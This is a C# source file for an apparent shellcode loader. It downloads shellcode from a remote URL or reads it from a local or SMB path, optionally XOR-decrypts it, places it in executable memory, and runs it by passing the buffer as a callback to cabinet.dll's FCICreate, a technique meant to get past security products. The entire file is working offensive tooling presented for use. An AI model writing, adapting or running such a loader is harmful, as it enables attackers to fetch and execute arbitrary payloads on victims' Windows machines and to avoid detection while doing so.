using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.IO;

class Program
{
    // Constants for VirtualAlloc
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_RELEASE = 0x8000;

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    // Definitions for FCICreate
    [StructLayout(LayoutKind.Sequential)]
    public struct ERF
    {
        public int erfOper;      // FCI/FDI error code
        public int erfType;      // Optional error code
        public int fError;       // Error present?
    }

    [DllImport("cabinet.dll")]
    public static extern IntPtr FCICreate(ref ERF perf, IntPtr pfnfcifil, IntPtr pfnfciAlloc, IntPtr pfnfciFree, IntPtr pfnfciOpen, IntPtr pfnfciRead, IntPtr pfnfciWrite, IntPtr pfnfciClose, IntPtr pfnfciSeek, IntPtr pfnfciDelete, IntPtr pfnfciTempFile, IntPtr pv);

    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: FCICreate.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
            return;
        }

        string sourcePath = args[1];
        string xorKey = null;

        if (args.Length == 4 && args[2] == "-k")
        {
            xorKey = args[3];
        }

        byte[] shellcode;

        if (args[0] == "-r")
        {
            Console.WriteLine("[Info] Attempting to download shellcode from the provided URL.");
            shellcode = DownloadShellcodeFromUrl(sourcePath);
        }
        else
        {
            Console.WriteLine("[Info] Attempting to read shellcode from the provided file path.");
            shellcode = File.ReadAllBytes(sourcePath);
        }

        if (!string.IsNullOrEmpty(xorKey))
        {
            Console.WriteLine("[Info] Decrypting shellcode using the provided XOR key.");
            shellcode = DecryptShellcode(shellcode, xorKey);
        }

        if (shellcode == null || shellcode.Length == 0)
        {
            Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Shellcode loaded/decrypted successfully.");
        }

        Console.WriteLine("[Info] Allocating memory for shellcode.");
        IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (hAlloc == IntPtr.Zero)
        {
            Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Memory allocated for shellcode.");
        }

        Marshal.Copy(shellcode, 0, hAlloc, shellcode.Length);

        ERF erf = new ERF();
        IntPtr result = FCICreate(ref erf, IntPtr.Zero, hAlloc, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

        if (erf.fError != 0)
        {
            Console.WriteLine($"[Failed] FCICreate failed with error code: {erf.erfOper}");
        }
        else
        {
            Console.WriteLine("[Success] FCICreate function was executed successfully.");
        }

        // Cleanup
        VirtualFree(hAlloc, 0, MEM_RELEASE);
    }

    static byte[] DownloadShellcodeFromUrl(string url)
    {
        using (var httpClient = new HttpClient())
        {
            try
            {
                var byteArray = httpClient.GetByteArrayAsync(url).Result;
                if (byteArray != null && byteArray.Length > 0)
                {
                    Console.WriteLine("[Success] Shellcode downloaded successfully.");
                    return byteArray;
                }
                else
                {
                    Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                return null;
            }
        }
    }

    static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
    {
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
        }
        return decryptedShellcode;
    }
}
